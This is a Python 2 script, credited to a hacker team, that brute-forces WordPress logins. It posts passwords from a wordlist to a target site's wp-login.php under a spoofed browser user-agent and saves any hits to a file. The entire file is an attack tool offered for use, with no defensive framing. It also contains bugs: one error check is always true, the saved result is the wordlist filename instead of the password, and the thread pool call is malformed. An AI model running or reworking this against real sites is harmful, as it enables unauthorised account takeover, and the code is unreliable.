# -*- coding: utf8 -*-
import requests
import io
import os, sys
from multiprocessing.pool import ThreadPool
qu = '\033[0;36m'
hi = '\033[0;32m'
pu = '\033[0;37m'
me = '\033[0;31m'
ku = '\033[0;33m'
def logo():
    print """%s
 __    __  ___  ___    ___  
/ / /\ \ \/ _ \/ __\  / __\  %sAuthor by abilseno11%s
\ \/  \/ / /_)/__\// / _\    %sGithub github.com/AbilSeno%s
 \  /\  / ___/ \/  \/ /      %sTeam anoncybfakeplayer%s
  \/  \/\/   \_____/\/       %sWordPress Brute Force
                             """%(ku,pu,ku,pu,ku,pu,ku,ku)
def brute(pw):
    try:
     for bf in open(pw).read().splitlines():
      hah=requests.get(sys.argv[1]+'/wp-login.php',timeout=11)
      if hah.status_code == 200 or 'error' in hah.text:
       eek=requests.post(sys.argv[1]+'/wp-login.php',headers={'content-type':'application/x-www-form-urlencoded','user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'},data={'log':sys.argv[2],'pwd':bf,'wp-submit':'Log+In','redirect_to':'','testcookie':'1'},cookies={'wordpress_test_cookie':'WP+Cookie+check'},timeout=11).text
       if 'wp-admin/profile.php' in eek:
        print "%s[%s!%s] %s:%s ===> %sFound"%(pu,qu,pu,sys.argv[2],bf,hi)
        os.system("touch found.txt")
        with open("found.txt","w") as g:
         g.write("%s:%s"%(sys.argv[2],pw))
         g.close()
        print "---> %s[%s!%s] %sSaved as %sfound.txt"%(pu,qu,pu,pu,ku)
       elif 'Invalid username' in eek:
        print "%s[%s!%s] %s:%s ===> %sInvalid Username"%(pu,qu,pu,sys.argv[2],bf,me)
       elif 'Unknown username' in eek:
        print "%s[%s!%s] %s:%s ===> %sUnknown Username"%(pu,qu,pu,sys.argv[2],bf,me)
       elif '<strong>Error</strong>: The password you entered for the username <strong>admin</strong> is incorrect.':
        print "%s[%s!%s] %s:%s ===> %sIncorrect Password"%(pu,qu,pu,sys.argv[2],bf,me)
       else:
        print "%s[%s!%s] %s:%s ===> %sFailed to bruteforce"%(pu,qu,pu,sys.argv[2],bf,me)
      else:
        print "%s[%s!%s] %s ===> %sPath not found / wp-login.php path not found"%(pu,qu,pu,sys.argv[1],me)
    except Exception as e:
        print  "%s[%s!%s] %s%s %s%s:%s ===> %sUknown Error / Not Found"%(pu,qu,pu,me,e,pu,sys.argv[2],bf,me)
    except IndexError: pass
    except TypeError: pass
try:
 os.system("clear")
 logo()
 try:
  print "%s[%s!%s] %sTrying to bruteforce %s%s"%(pu,qu,pu,pu,ku,sys.argv[1])
  print "%s[%s!%s] %sEquipment :\n • Username : %s%s \n %s• Password filename : %s%s"%(pu,qu,pu,pu,ku,sys.argv[2],pu,ku,sys.argv[3])
  ThreadPool(5).map(brute(sys.argv[3]))
 except IndexError: print "%s[%s!%s] %sUse: python2 https://domain.com username listpw.txt"%(pu,qu,pu,pu)
 except IOError: print "%s[%s!%s] %sFile not found!!!"%(pu,qu,pu,me)
except KeyboardInterrupt:exit('\n%s[%s!%s] Exit'%(pu,qu,pu))
